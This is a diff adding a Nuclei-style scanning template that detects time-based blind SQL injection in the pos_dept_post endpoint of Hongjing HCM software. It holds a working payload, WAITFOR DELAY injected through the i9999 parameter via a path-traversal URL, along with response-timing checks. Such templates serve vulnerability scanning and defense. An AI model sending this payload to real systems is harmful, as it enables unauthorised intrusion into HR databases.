@@ -1,0 +1,47 @@
+id: poc-yaml-hongjing-hcm-pos-dept-post-sqli
+info:
+  name: 宏景HCM pos_dept_post SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects a potential SQL Injection vulnerability in 宏景HCM pos_dept_post endpoint.
+
+variables:
+  t1: '{{rand_int(5,10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        GET /login/index.html HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "宏景软件"
+
+  - raw:
+      - |
+        POST /templates/attestation/../../pos/roleinfo/pos_dept_post HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        usertable=h00&usernumber=1&i9999=-1';WAITFOR DELAY '0:0:{{t1}}'--+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ""
+        part: body
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
